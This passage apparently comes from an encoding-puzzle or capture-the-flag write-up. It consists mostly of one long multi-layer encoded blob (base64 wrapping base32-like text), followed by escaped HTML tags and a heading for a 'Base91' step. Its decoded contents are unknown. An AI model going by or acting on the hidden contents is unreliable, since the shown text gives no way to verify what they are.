ktLQlJHRkNWWVJCTEdCU0NNT0JORk03R1lJWkJHTkJDTUpaMkdFVkVDUlpQRk03R1lKUkNHRkRWS0tCUkdCU0NNTVJKR0JFR0FMWk1GTTdHWUlaQkdGUlZDVkpXR0VWRUNSWlBGTTdHVzNUVEdGRFZLS0JSR0ZRU0VXSlZGTTdGU1lUUkdJVVQ2UUJVR0JTQ01PQk5GTTdHVzVEVkdJVVdHV0JXR0VWRUNSWlFGTTdUV1FKSEdGRFZLS0JSR0JFR0FRSlpGTTdGU1lUUkdJVVMyTkJPR0JGRU1WUktHRVZFQ1JaU0ZNN0dXMjNTR0ZEVktLQlJHQkVHQUtKSUdCU0NNT0JORk03R1lJWkJHQlNXRU9SSUdGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVRNT1JUR0pCRlFaSlNGTTdHWUlaQkdJVVZVVVJWR0VWRUNSWk9GTTdFT1VKS0ZNN0ZTWVRSR0lVVE1PUlRHSVRUMlhCUkZNN0dXM1RUR0JTV0VQSkpHRkRWS0tCUkdCRUdBUUpYRk03RlNZVFJHSVVWQ1RCV0dJVFQyWEJSRk03R1cyM1NHRlJWQ1ZKV0dFVkVDUlpQRk03RU9VSkpGTTdGU1lUUkdJVVMyTkJSR003VktLWlZGTTdHWUlaQkdJVVMyTkJRR0VWRUNSWlFGTTdHVzRMVUdGRFZLS0JSR0JFR0FOSlBGTTdGU1lUUkdJVVZDVEJXR0lUVDJYQlJGTTdHVzVEVkdCU1dFT1JJR0ZEVktLQlJHRlFTRVRKTUdCRUdBTFpNRk03R1c1RFZHSVVVUVJSVEdFVkVDUlpQRk03R1cyRFJHRkRWS0tCUkdGUVNFV0pYRk03RlNZVFJHSVVVUVJSVkdCRUdBTFpNRk03R1c1RFZHSVVVUVJSVEdFVkVDUlpPRk03VFdSWkpHRkRWS0tCUkdCRUdBUUpaRk03RlNZVFJHSVVUTU9SUEdCRkU2WEJMR0VWRUNSWlJGTTdHVzNUVEdGRFZLS0JSR0VWRUNPWktHQkVHQUxaTUZNN0dXM1RUR0ZSVlVXWlhHRVZFQ1JaUkZNN0VPVUpJRk03RlNZVFJHSVVUTU9SUEdCRkZRWVJNR0VWRUNSWlFGTTdHVzVEVkdGRFZLS0JSR0JFR0FOSlBGTTdGU1lUUkdJVVVRUlJaR01TRFVJUlVGTTdHVzRMVUdJVVVRUlJUR0VWRUNSWlFGTTdHWUlaQkdGRFZLS0JSR0VWRUNSWk9GTTdGU1lUUkdJVVRNT1JUR0lUVDJYQlJGTTdHVzIzU0dJVVdHV0JXR0VWRUNSWlBGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQlNHSk9YRzNSVEZNN0dZSVpCR0ZSVkNWSldHRVZFQ1JaU0ZNN1RXUUpIR0ZEVktLQlJHQkVHQU5KT0ZNN0ZTWVRSR0lVVkNUQldHRkNWWVNSUEZNN0dXMkRSR05CQ01KWjJHRVZFQ1JaUkZNN0VPVUpJRk03RlNZVFJHSVVUTU9SUEdCRkZRWVJNR0VWRUNSWlBGTTdUV1JCSUdGRFZLS0JSR0ZRU0VUSk1HQlNDTU9CTkZNN0dXNExVR0lVVE1PUlJHRVZFQ1JaUUZNN1RXUUpIR0ZEVktLQlJHRkNWWVRKV0ZNN0ZTWVRSR0lVUzJOQlJHTVNEVUlSVUZNN0dXM1RUR0JTV0VRQktHRkRWS0tCUkdGUVNFWko0Rk03RlNZVFJHSVVUTU9SVEdKT1hHM1JURk03R1c0TFVHSVVTMk5CUUdFVkVDUlpTRk03VFdSQklHRkRWS0tCUkdCU0NNUFJORk03RlNZVFJHSVVTSUxSTkdCRkU2WEJMR0VWRUNSWlJGTTdHWUlaQkdGRFZLS0JSR0lUVDJZUllGTTdGU1lUUkdJVVMyTkJTR0pPWEczUlRGTTdHVzVEVkdOQkRRTVo0R0VWRUNSWlNGTTdUV1JaSkdGRFZLS0JSR0ZRU0VXSlFGTTdGU1lUUkdJVVVRUlJaR003VktLWlZGTTdHWUlaQkdJVVRNT1JSR0VWRUNSWlNGTTdHVzVEVkdGRFZLS0JSR0ZDVllUSlhGTTdGU1lUUkdJVVNJTFJWR003VktLWlZGTTdHVzRMVUdJVVZDVEJVR0VWRUNSWlFGTTdHVzIzU0dGRFZLS0JSR0JTQ01NUkpHQkVHQUxaTUZNN0dXM1RUR0lVV0dXQldHRVZFQ1JaVEZNN1RXUlpKR0ZEVktLQlJHQlNDTVNSWUZNN0ZTWVRSR0lVVDZRQlVHQkVHQUxaTUZNN0dXNURWR05CQzZMSjNHRVZFQ1JaUUZNN0dXMkRSR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVUzJOQk9HQkZGUVlSTUdFVkVDUlpPRk03VFdSQklHRkRWS0tCUkdFVkVDUkJXRk03RlNZVFJHSVVTMk5CT0dCRkU2WEJMR0VWRUNSWlRGTTdHR0tKRUdGRFZLS0JSR0ZDVllSQkxHQkVHQUxaTUZNN0dXMjNTR05CRFFNWjRHRVZFQ1JaUUZNN0dZSVpCR0ZEVktLQlJHSVRUMlhaWkZNN0ZTWVRSR0lVU0lMUlFHTTdWS0taVkZNN0dXNExVR0lVVlVVUlZHRVZFQ1JaU0ZNN0dXNURWR0ZEVktLQlJHQlNDTVBST0ZNN0ZTWVRSR0lVU0lMUlZHTVNEVUlSVUZNN0dXM1RUR0ZSVlVXWlhHRVZFQ1JaU0ZNN0dXNExVR0ZEVktLQlJHQlNDTVBST0ZNN0ZTWVRSR0lVU0lMUlZHTTdWS0taVkZNN0dXM1RUR0JTV0VRQktHRkRWS0tCUkdCU0NNT1pVRk03RlNZVFJHSVVWQ1RCU0dCRkVNVlJLR0VWRUNSWlBGTTdUV1JaSkdGRFZLS0JSR0ZRU0VXSlhGTTdGU1lUUkdJVVRNT1JQR0JGRU1WUktHRVZFQ1JaT0ZNN0dXMkRSR0ZEVktLQlJHQlNDTVBSU0ZNN0ZTWVRSR0lVUzJOQk9HQkZFNlhCTEdFVkVDUlpQRk03R1lKUkNHRkRWS0tCUkdFVkVDUlpWRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1cyRFJHSVVUNlFCU0dFVkVDUlpTRk03VFdSQklHRkRWS0tCUkdGQ1ZZVUJVRk03RlNZVFJHSVVTMk5CU0dKQkZRWkpTRk03R1c0TFVHSVVWVVVSVkdFVkVDUlpQRk03R1cyRFJHRkRWS0tCUkdCRUdBUUpZRk03RlNZVFJHSVVWQ1RCV0dKT1hHM1JURk03R1c1RFZHSVVTMk5CUUdFVkVDUlpSRk03R1cyM1NHRkRWS0tCUkdJVFQyWVJTRk03RlNZVFJHSVVUTU9SWEdNN1ZLS1pWRk03R1c0TFVHQlNXRVBKSkdGRFZLS0JSR0lUVDJZUlVGTTdGU1lUUkdJVVVRUlJWR0pPWEczUlRGTTdHVzRMVUdOQkNNSloyR0VWRUNSWlNGTTdHVzRMVUdGRFZLS0JSR0ZDVllVQlBGTTdGU1lUUkdJVVNJTFJSR0JTQ01PQk5GTTdHVzJEUkdJVVQ2UUJTR0VWRUNSWlNGTTdHVzVEVkdGRFZLS0JSR0JFR0FLSklHRVZFQ1FKT0ZNN0dXMkRSR0ZSVlVXWlhHRVZFQ1JaUEZNN0dHS0pFR0ZEVktLQlJHRkNWWVVCVkZNN0ZTWVRSR0lVUzJOQlJHTTdWS0taVkZNN0dXM1RUR0lVUzJOQlFHRVZFQ1JaUkZNN0dHSlJER0ZEVktLQlJHRlFTRVRKTUdCU0NNT0JORk03R1czVFRHQlNXRVFCS0dGRFZLS0JSR0JFR0FLSklHQlNDTU9CTkZNN0dXMkRSR05CRFFNWjRHRVZFQ1JaUEZNN0VPVUpJRk03RlNZVFJHSVVUNlFCVUdFVkVDUUpPRk03R1c1RFZHSVVTSUxSUEdFVkVDUlpSRk03R1lKUkNHRkRWS0tCUkdCU0NNTVJKR0VWRUNRSk9GTTdHWUlaQkdJVVZVVVJWR0VWRUNSWlFGTTdHR0pSREdGRFZLS0JSR0ZDVllSQkxHQlNDTU9CTkZNN0dXM1RUR05CQ01KWjJHRVZFQ1JaUUZNN0dZSlJDR0ZEVktLQlJHRVZFQ1JaT0ZNN0ZTWVRSR0lVVE1PUlhHSk9YRzNSVEZNN0dXM1RUR0lVU0lMUlBHRVZFQ1JaUkZNN0VPVUpJRk03RlNZVFJHSVVWQ1RCV0dFVkVDUUpPRk03R1cyRFJHQlNXRVBKSkdGRFZLS0JSR0ZDVllYQjJGTTdGU1lUUkdJVVVRUlJaR0pPWEczUlRGTTdHWUlaQkdJVVNJTFJQR0VWRUNSWk9GTTdHR0tKRUdGRFZLS0JSR0JTQ01QUlNGTTdGU1lUUkdJVVVRUlJWR0lUVDJYQlJGTTdHVzVEVkdJVVdHV0JXR0VWRUNSWlBGTTdHWUlaQkdGRFZLS0JSR0lUVDJZUlhGTTdGU1lUUkdJVVZDVEJWR01TRFVJUlVGTTdHVzJEUkdOQkM2TEozR0VWRUNSWlBGTTdHVzVEVkdGRFZLS0JSR0ZRU0VXSlNGTTdGU1lUUkdJVVNJTFJOR0JGRTZYQkxHRVZFQ1JaUEZNN0dHS0pFR0ZEVktLQlJHRkNWWVhCMkZNN0ZTWVRSR0lVU0lMUlJHRkNWWVNSUEZNN0dXNExVR0lVU0lMUlBHRVZFQ1JaUEZNN0dHS0pFR0ZEVktLQlJHSVRUMllSV0ZNN0ZTWVRSR0lVVVFSUlJHQkZFNlhCTEdFVkVDUlpQRk03VFdSWkpHRkRWS0tCUkdJVFQyWFpaRk03RlNZVFJHSVVVUVJSWkdNN1ZLS1pWRk03R1c0TFVHSVVTSUxSUEdFVkVDUlpRRk03R1lKUkNHRkRWS0tCUkdJVFQyWVJVRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1c0TFVHTkJDTUpaMkdFVkVDUlpPRk03R1c0TFVHRkRWS0tCUkdGUVNFVlJYRk03RlNZVFJHSVVUNlFCVUdKT1hHM1JURk03R1cyM1NHSVVTMk5CUUdFVkVDUlpTRk03R1cyM1NHRkRWS0tCUkdGQ1ZZVUJTRk03RlNZVFJHSVVUNlFCVUdKQkZRWkpTRk03R1lJWkJHSVVVUVJSVEdFVkVDUlpURk03R1lKUkNHRkRWS0tCUkdJVFQyM1I2Rk03RlNZVFJHSVVTSUxSVkdNN1ZLS1pWRk03R1c0TFVHTkJDTUpaMkdFVkVDUlpSRk03R1czVFRHRkRWS0tCUkdGUVNFWko1Rk03RlNZVFJHSVVUNlFCVUdFVkVDUUpPRk03R1czVFRHSVVWVVVSVkdFVkVDUlpRRk03R1cyM1NHRkRWS0tCUkdJVFQyWVJWRk03RlNZVFJHSVVUTU9SVEdCU0NNT0JORk03R1c0TFVHQlNXRVBKSkdGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVQ2UUJVR0JFR0FMWk1GTTdHVzIzU0dJVVQ2UUJTR0VWRUNSWk9GTTdHVzJEUkdGRFZLS0JSR0JTQ01NUkpHQkVHQUxaTUZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaUEZNN0VPVUpLRk03RlNZVFJHSVVVUVJSVUdNN1ZLS1pWRk03R1czVFRHRlJWQ1ZKV0dFVkVDUlpPRk03R1c0TFVHRkRWS0tCUkdFVkVDVVpaRk03RlNZVFJHSVVWQ1RCV0dJVFQyWEJSRk03R1c1RFZHSVVVUVJSVEdFVkVDUlpSRk03R0dLSkVHRkRWS0tCUkdFVkVDUlpRRk03RlNZVFJHSVVUTU9SVEdJVFQyWEJSRk03R1c1RFZHTkJEUU1aNEdFVkVDUlpRRk03R1lJWkJHRkRWS0tCUkdFVkVDT1pLR0JFR0FMWk1GTTdHWUlaQkdGUlZDVkpXR0VWRUNSWlNGTTdHVzRMVUdGRFZLS0JSR0lUVDJZUlhGTTdGU1lUUkdJVVVRUlJaR003VktLWlZGTTdHVzIzU0dCU1dFT1JJR0ZEVktLQlJHSVRUMlhaWUZNN0ZTWVRSR0lVVVFSUlZHSVRUMlhCUkZNN0dXMkRSR0lVVVFSUlRHRVZFQ1JaUkZNN0dXNExVR0ZEVktLQlJHQlNDTU1SSkdFVkVDUUpPRk03R1czVFRHSVVWQ1RCVUdFVkVDUlpTRk03RU9VSklGTTdGU1lUUkdJVVZDVEJXR0ZRU0VVWlFGTTdHVzVEVkdJVVNJTFJQR0VWRUNSWlBGTTdUV1FKSEdGRFZLS0JSR0JTQ01QUlNGTTdGU1lUUkdJVVNJTFJWR0pPWEczUlRGTTdHVzNUVEdJVVQ2UUJTR0VWRUNSWlJGTTdHVzNUVEdGRFZLS0JSR0JFR0FNUlVGTTdGU1lUUkdJVVQ2UUJVR0ZRU0VVWlFGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlFGTTdUV1FKSEdGRFZLS0JSR0JTQ01QUk9GTTdGU1lUUkdJVVRNT1JUR0pCRlFaSlNGTTdHVzIzU0dJVVNJTFJQR0VWRUNSWlJGTTdUV1FKSEdGRFZLS0JSR0ZDVllUSlhGTTdGU1lUUkdJVVZDVEJXR0pCRlFaSlNGTTdHVzVEVkdCU1dFUEpKR0ZEVktLQlJHRlFTRVdKV0ZNN0ZTWVRSR0lVVDZRQlVHSkJGUVpKU0ZNN0dXMkRSR0JTV0VQSkpHRkRWS0tCUkdFVkVDVVpaRk03RlNZVFJHSVVUTU9SWEdKT1hHM1JURk03R1c1RFZHTkJDNkxKM0dFVkVDUlpTRk03VFdSWkpHRkRWS0tCUkdJVFQyWVJWRk03RlNZVFJHSVVUNlFCUUdCRkU2WEJMR0VWRUNSWlBGTTdHVzJEUkdGRFZLS0JSR0lUVDIzUjRGTTdGU1lUUkdJVVMyTkJTR0VWRUNRSk9GTTdHWUlaQkdGUlZVV1pYR0VWRUNSWlRGTTdHWUpSQ0dGRFZLS0JSR0ZRU0VUSk1HRVZFQ1FKT0ZNN0dXNURWR0JTV0VPUklHRkRWS0tCUkdFVkVDVVpaRk03RlNZVFJHSVVTSUxSUkdCU0NNT0JORk03R1c1RFZHSVVWVVVSVkdFVkVDUlpTRk03R1lJWkJHRkRWS0tCUkdCRUdBTkpRRk03RlNZVFJHSVVUNlFCWUdNU0RVSVJVRk03R1c1RFZHTkJDNkxKM0dFVkVDUlpRRk03RU9VSklGTTdGU1lUUkdJVVMyTkJXR0pPWEczUlRGTTdHVzJEUkdGUlZVV1pYR0VWRUNSWlBGTTdHWUtKREdGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVNJTFJSR0pCRlFaSlNGTTdHVzIzU0dJVVVRUlJUR0VWRUNSWlJGTTdHVzIzU0dGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVMyTkJTR0JFR0FMWk1GTTdHVzRMVUdJVVQ2UUJTR0VWRUNSWlJGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQlJHTTdWS0taVkZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaVEZNN0dXNExVR0ZEVktLQlJHQkVHQVFKWkZNN0ZTWVRSR0lVVkNUQlZHTVNEVUlSVUZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHQkVHQVFKWkZNN0ZTWVRSR0lVVE1PUlRHRkNWWVNSUEZNN0dXMjNTR0ZSVlVXWlhHRVZFQ1JaUEZNN0dZSlJDR0ZEVktLQlJHQkVHQU5KVEZNN0ZTWVRSR0lVVDZRQlVHQlNDTU9CTkZNN0dXMkRSR0JTV0VQSkpHRkRWS0tCUkdJVFQyWVJURk03RlNZVFJHSVVVUVJSVkdFVkVDUUpPRk03R1cyM1NHSVVTMk5CUUdFVkVDUlpURk03R1lLSkRHRkRWS0tCUkdCU0NNU1JaRk03RlNZVFJHSVVUNlFCVUdCRUdBTFpNRk03R1c0TFVHSVVUTU9SUkdFVkVDUlpTRk03R1cyM1NHRkRWS0tCUkdGQ1ZZVUJQRk03RlNZVFJHSVVTMk5CUkdNN1ZLS1pWRk03R1cyRFJHQlNXRVFCS0dGRFZLS0JSR0JTQ01NUkpHQkVHQUxaTUZNN0dXM1RUR0lVVDZRQlNHRVZFQ1JaU0ZNN0dXNURWR0ZEVktLQlJHRkNWWVVCUEZNN0ZTWVRSR0lVVVFSUlpHTVNEVUlSVUZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaUUZNN0VPVUpJRk03RlNZVFJHSVVTMk5CT0dCRkVNVlJLR0VWRUNSWlRGTTdHVzJEUkdGRFZLS0JSR0JTQ01QUlVGTTdGU1lUUkdJVVQ2UUJRR0JGRU1WUktHRVZFQ1JaUEZNN0dHSlJER0ZEVktLQlJHRkNWWVhCM0ZNN0ZTWVRSR0lVUzJOQlNHSkJGUVpKU0ZNN0dXNURWR05CQzZMSjNHRVZFQ1JaT0ZNN0dXNURWR0ZEVktLQlJHSVRUMlZSTkdCRUdBTFpNRk03R1c1RFZHTkJDTUpaMkdFVkVDUlpSRk03R0dLSkVHRkRWS0tCUkdGQ1ZZVUJTRk03RlNZVFJHSVVUNlFCVEdNN1ZLS1pWRk03R1cyRFJHTkJEUU1aNEdFVkVDUlpSRk03R0dLSkVHRkRWS0tCUkdGUVNFV0pXRk03RlNZVFJHSVVUTU9SUEdCRkZRWVJNR0VWRUNSWlRGTTdHWUtKREdGRFZLS0JSR0JTQ01QUlNGTTdGU1lUUkdJVVVRUlJVR01TRFVJUlVGTTdHVzVEVkdJVVNJTFJQR0VWRUNSWk9GTTdHVzRMVUdGRFZLS0JSR0lUVDJZUllGTTdGU1lUUkdJVVRNT1JTR01TRFVJUlVGTTdHWUlaQkdCU1dFUEpKR0ZEVktLQlJHRkNWWVVCV0ZNN0ZTWVRSR0lVVDZRQlVHQkVHQUxaTUZNN0dXNURWR0JTV0VRQktHRkRWS0tCUkdGQ1ZZVUJVRk03RlNZVFJHSVVTSUxSVkdNN1ZLS1pWRk03R1lJWkJHRlJWQ1ZKV0dFVkVDUlpTRk03R1c0TFVHRkRWS0tCUkdCRUdBTkpNRk03RlNZVFJHSVVTMk5CT0dCRkU2WEJMR0VWRUNSWlBGTTdHWUlaQkdGRFZLS0JSR0ZRU0VXSlNGTTdGU1lUUkdJVVNJTFJSR0JFR0FMWk1GTTdHVzNUVEdOQkRRTVo0R0VWRUNSWlBGTTdHR0pSREdGRFZLS0JSR0VWRUNSQlZGTTdGU1lUUkdJVVVRUlJSR0JGRlFZUk1HRVZFQ1JaUEZNN0dZSVpCR0ZEVktLQlJHQkVHQU5KTkZNN0ZTWVRSR0lVVVFSUlZHRkNWWVNSUEZNN0dXNExVR05CQ01KWjJHRVZFQ1JaU0ZNN0VPVUpLRk03RlNZVFJHSVVTMk5CU0dGQ1ZZU1JQRk03R1czVFRHSVVWQ1RCVUdFVkVDUlpURk03VFdSWkpHRkRWS0tCUkdCU0NNT1pVRk03RlNZVFJHSVVUTU9SVEdGUVNFVVpRRk03R1czVFRHSVVWVVVSVkdFVkVDUlpTRk03RU9VSkpGTTdGU1lUUkdJVVMyTkJTR0ZRU0VVWlFGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlBGTTdFT1VKSUZNN0ZTWVRSR0lVVDZRQlVHSVRUMlhCUkZNN0dXMjNTR0lVV0dXQldHRVZFQ1JaUkZNN0dXM1RUR0ZEVktLQlJHSVRUMlhaWUZNN0ZTWVRSR0lVVkNUQjJHTTdWS0taVkZNN0dXNURWR0lVUzJOQlFHRVZFQ1JaVEZNN1RXUlpKR0ZEVktLQlJHQlNDTU9aVUZNN0ZTWVRSR0lVVE1PUlRHRlFTRVVaUUZNN0dXMjNTR0lVUzJOQlFHRVZFQ1JaUkZNN0VPVUpKRk03RlNZVFJHSVVVUVJSVkdFVkVDUUpPRk03R1lJWkJHRlJWQ1ZKV0dFVkVDUlpSRk03R1cyRFJHRkRWS0tCUkdGQ1ZZUkJMR0JTQ01PQk5GTTdHVzJEUkdJVVMyTkJRR0VWRUNSWlRGTTdFT1VKSkZNN0ZTWVRSR0lVVE1PUlRHRkNWWVNSUEZNN0dZSVpCR0lVU0lMUlBHRVZFQ1JaU0ZNN0dHS0pFR0ZEVktLQlJHRVZFQ09aS0dFVkVDUUpPRk03R1czVFRHQlNXRU9SSUdGRFZLS0JSR0JFR0FOSlNGTTdGU1lUUkdJVVRNT1JUR0ZRU0VVWlFGTTdHVzIzU0dGUlZDVkpXR0VWRUNSWlBGTTdHVzNUVEdGRFZLS0JSR0lUVDJZUlVGTTdGU1lUUkdJVVMyTkJTR0ZRU0VVWlFGTTdHVzVEVkdJVVZDVEJVR0VWRUNSWlFGTTdFT1VKSUZNN0ZTWVRSR0lVVDZRQlVHRlFTRVVaUUZNN0dXNURWR0lVVVFSUlRHRVZFQ1JaUkZNN0VPVUpLRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1c0TFVHSVVWQ1RCVUdFVkVDUlpTRk03R1cyM1NHRkRWS0tCUkdFVkVDUlpSRk03RlNZVFJHSVVTSUxSUkdCU0NNT0JORk03R1c1RFZHSVVUTU9SUkdFVkVDUlpRRk03R1lKUkNHRkRWS0tCUkdGUVNFWkozRk03RlNZVFJHSVVVUVJSVUdNU0RVSVJVRk03R1czVFRHRlJWQ1ZKV0dFVkVDUlpRRk03R1lJWkJHRkRWS0tCUkdJVFQyWVJURk03RlNZVFJHSVVTSUxSUUdNN1ZLS1pWRk03R1czVFRHSVVWVVVSVkdFVkVDUlpRRk03VFdRSkhHRkRWS0tCUkdFVkVDT1pLR0JTQ01PQk5GTTdHVzIzU0dJVVZVVVJWR0VWRUNSWlRGTTdHWUlaQkdGRFZLS0JSR0ZRU0VUSk1HRVZFQ1FKT0ZNN0dXMkRSR0lVVVFSUlRHRVZFQ1JaVEZNN0dXM1RUR0ZEVktLQlJHRVZFQ1JaUEZNN0ZTWVRSR0lVUzJOQldHTVNEVUlSVUZNN0dXNExVR0lVVVFSUlRHRVZFQ1JaUEZNN0dHSlJER0ZEVktLQlJHSVRUMllSVEZNN0ZTWVRSR0lVVVFSUlVHTVNEVUlSVUZNN0dXNURWR05CQ01KWjJHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHQlNDTVNSMkZNN0ZTWVRSR0lVVE1PUlhHTTdWS0taVkZNN0dXNURWR0lVVkNUQlVHRVZFQ1JaVEZNN0dXNURWR0ZEVktLQlJHRVZFQ1JaT0ZNN0ZTWVRSR0lVVkNUQldHQkVHQUxaTUZNN0dXM1RUR0lVVDZRQlNHRVZFQ1JaT0ZNN0dXMjNTR0ZEVktLQlJHQlNDTU1SSkdCRUdBTFpNRk03R1czVFRHSVVWVVVSVkdFVkVDUlpSRk03R1czVFRHRkRWS0tCUkdGQ1ZZWEIzRk03RlNZVFJHSVVWQ1RCV0dJVFQyWEJSRk03R1c1RFZHSVVUNlFCU0dFVkVDUlpSRk03RU9VSklGTTdGU1lUUkdJVVMyTkJTR0pCRlFaSlNGTTdHVzRMVUdOQkNNSloyR0VWRUNSWlRGTTdHWUlaQkdGRFZLS0JSR0JTQ01QUk5GTTdGU1lUUkdJVVRNT1JQR0JGRTZYQkxHRVZFQ1JaU0ZNN1RXUUpIR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVVFSUlZHSkJGUVpKU0ZNN0dZSVpCR0lVVkNUQlVHRVZFQ1JaUEZNN0VPVUpLRk03RlNZVFJHSVVTMk5CUkdNU0RVSVJVRk03R1c1RFZHRlJWVVdaWEdFVkVDUlpTRk03RU9VSktGTTdGU1lUUkdJVVRNT1JYR0pPWEczUlRGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlJGTTdUV1JCSUdGRFZLS0JSR0VWRUNVWlpGTTdGU1lUUkdJVVZDVEJXR0ZRU0VVWlFGTTdHVzNUVEdJVVZVVVJWR0VWRUNSWlNGTTdHVzIzU0dGRFZLS0JSR0lUVDJZUlZGTTdGU1lUUkdJVVRNT1JUR0ZDVllTUlBGTTdHVzRMVUdJVVMyTkJRR0VWRUNSWlNGTTdUV1JaSkdGRFZLS0JSR0VWRUNSWlRGTTdGU1lUUkdJVVQ2UUJUR003VktLWlZGTTdHVzIzU0dJVVNJTFJQR0VWRUNSWk9GTTdHVzRMVUdGRFZLS0JSR0ZRU0VaSjRGTTdGU1lUUkdJVVZDVEJXR0ZRU0VVWlFGTTdHVzJEUkdJVVMyTkJRR0VWRUNSWlRGTTdHR0tKRUdGRFZLS0JSR0ZDVllVQlNGTTdGU1lUUkdJVVZDVEJWR003VktLWlZGTTdHVzVEVkdOQkNNSloyR0VWRUNSWlJGTTdHWUtKREdGRFZLS0JSR0JFR0FRSlpGTTdGU1lUUkdJVVRNT1JUR0lUVDJYQlJGTTdHVzRMVUdJVVdHV0JXR0VWRUNSWk9GTTdUV1JaSkdGRFZLS0JSR0lUVDJZUlRGTTdGU1lUUkdJVVQ2UUJZR0pPWEczUlRGTTdHWUlaQkdOQkNNSloyR0VWRUNSWlNGTTdHVzVEVkdGRFZLS0JSR0JFR0FLSklHRVZFQ1FKT0ZNN0dXNExVR0lVVkNUQlVHRVZFQ1JaUEZNN1RXUUpIR0ZEVktLQlJHQlNDTU9aVkZNN0ZTWVRSR0lVVDZRQlVHRVZFQ1FKT0ZNN0dXMjNTR0JTV0VPUklHRkRWS0tCUkdGUVNFV0pWRk03RlNZVFJHSVVVUVJSVkdJVFQyWEJSRk03R1lJWkJHSVVVUVJSVEdFVkVDUlpTRk03VFdRSkhHRkRWS0tCUkdGUVNFWko1Rk03RlNZVFJHSVVUNlFCUUdCRkZRWVJNR0VWRUNSWlRGTTdHVzNUVEdGRFZLS0JSR0JTQ01QUlFGTTdGU1lUUkdJVVRNT1JUR0lUVDJYQlJGTTdHVzVEVkdOQkRRTVo0R0VWRUNSWlNGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQldHTVNEVUlSVUZNN0dXNURWR0lVVE1PUlJHRVZFQ1JaUUZNN0dXNExVR0ZEVktLQlJHRVZFQ09aS0dCU0NNT0JORk03R1cyM1NHSVVUNlFCU0dFVkVDUlpQRk03R1lJWkJHRkRWS0tCUkdCRUdBUUpZRk03RlNZVFJHSVVUTU9SUEdCRkU2WEJMR0VWRUNSWk9GTTdUV1JCSUdGRFZLS0JSR0ZDVllVQldGTTdGU1lUUkdJVVMyTkJXR0pPWEczUlRGTTdHVzIzU0dJVVRNT1JSR0VWRUNSWlFGTTdHVzJEUkdGRFZLS0JSR0JTQ01NUkpHQlNDTU9CTkZNN0dXM1RUR0ZSVlVXWlhHRVZFQ1JaVEZNN0dXNExVR0ZEVktLQlJHQlNDTVBSUUZNN0ZTWVRSR0lVVVFSUlpHSk9YRzNSVEZNN0dXM1RUR0lVU0lMUlBHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHRVZFQ1JaUEZNN0ZTWVRSR0lVVVFSUlpHTTdWS0taVkZNN0dZSVpCR0lVVVFSUlRHRVZFQ1JaT0ZNN1RXUkJJR0ZEVktLQlJHRkNWWVVCUkZNN0ZTWVRSR0lVVVFSUlZHSk9YRzNSVEZNN0dXNURWR0lVVkNUQlVHRVZFQ1JaUUZNN0VPVUpJRk03RlNZVFJHSVVVUVJSUkdCRkVNVlJLR0VWRUNSWlFGTTdHVzRMVUdGRFZLS0JSR0JTQ01NUkpHQlNDTU9CTkZNN0dXMjNTR05CRFFNWjRHRVZFQ1JaUkZNN1RXUkJJR0ZEVktLQlJHSVRUMjNSNEZNN0ZTWVRSR0lVUzJOQldHTTdWS0taVkZNN0dXM1RUR0JTV0VRQktHRkRWS0tCUkdCRUdBTkpURk03RlNZVFJHSVVTMk5CUkdNN1ZLS1pWRk03R1c0TFVHQlNXRVBKSkdGRFZLS0JSR0VWRUNSWlBGTTdGU1lUUkdJVVNJTFJWR003VktLWlZGTTdHVzVEVkdCU1dFT1JJR0ZEVktLQlJHRkNWWVVCV0ZNN0ZTWVRSR0lVVkNUQldHQkVHQUxaTUZNN0dXM1RUR0lVVVFSUlRHRVZFQ1JaUUZNN1RXUkJJR0ZEVktLQlJHQlNDTVBST0ZNN0ZTWVRSR0lVVDZRQlFHQkZFTVZSS0dFVkVDUlpSRk03VFdRSkhHRkRWS0tCUkdGUVNFV0pTRk03RlNZVFJHSVVTSUxSVkdNU0RVSVJVRk03R1cyM1NHSVVVUVJSVEdFVkVDUlpPRk03RU9VSktGTTdGU1lUUkdJVVMyTkJTR0VWRUNRSk9GTTdHVzIzU0dCU1dFT1JJR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVDZRQlVHQlNDTU9CTkZNN0dXNExVR0lVVDZRQlNHRVZFQ1JaUEZNN0dZS0pER0ZEVktLQlJHRlFTRVdKUkZNN0ZTWVRSR0lVVDZRQlVHQkVHQUxaTUZNN0dZSVpCR05CQ01KWjJHRVZFQ1JaU0ZNN1RXUkJJR0ZEVktLQlJHQlNDTVBSVUZNN0ZTWVRSR0lVVVFSUlVHTTdWS0taVkZNN0dXM1RUR0lVUzJOQlFHRVZFQ1JaT0ZNN0dHS0pFR0ZEVktLQlJHQlNDTU9aVkZNN0ZTWVRSR0lVVkNUQldHSVRUMlhCUkZNN0dXMkRSR0lVVVFSUlRHRVZFQ1JaU0ZNN0dXMjNTR0ZEVktLQlJHRlFTRVdKUUZNN0ZTWVRSR0lVVVFSUlZHRkNWWVNSUEZNN0dXNURWR05CQzZMSjNHRVZFQ1JaT0ZNN0VPVUpKRk03RlNZVFJHSVVUTU9SVEdFVkVDUUpPRk03R1cyM1NHQlNXRVBKSkdGRFZLS0JSR0ZRU0VXSlVGTTdGU1lUUkdJVVVRUlJSR0JGRlFZUk1HRVZFQ1JaUkZNN0VPVUpJRk03RlNZVFJHSVVUTU9SU0dNNkE9PT09
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Base91&lt;/p&gt;
